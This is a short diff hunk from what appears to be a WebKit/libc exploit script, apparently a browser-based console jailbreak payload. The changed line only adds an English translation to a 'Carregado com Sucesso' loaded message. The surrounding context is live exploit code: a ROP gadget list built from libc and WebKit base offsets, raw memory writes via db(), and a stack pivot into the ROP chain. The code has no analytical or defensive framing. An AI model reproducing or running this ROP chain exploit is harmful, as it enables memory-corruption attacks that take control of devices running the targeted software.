@@ -7342,7 +7342,7 @@ db([128,0]);
 set_gadgets([libc_base+248252,libc_base+50775,libc_base+793877,ropchain+219976,webkit_base+7438103,libc_base+811575]);
 db([0,0]);
 db([5,0,0,0,0,0]);
-if (typeof LoadedMSG == 'undefined'){LoadedMSG = "Carregado com Sucesso ✔";}
+if (typeof LoadedMSG == 'undefined'){LoadedMSG = "Carregado com Sucesso / Successfully Loaded ✔";}
 window.msgs.innerHTML="<div>"+LoadedMSG+"</div>";
 setTimeout(function(){
 pivot(ropchain);
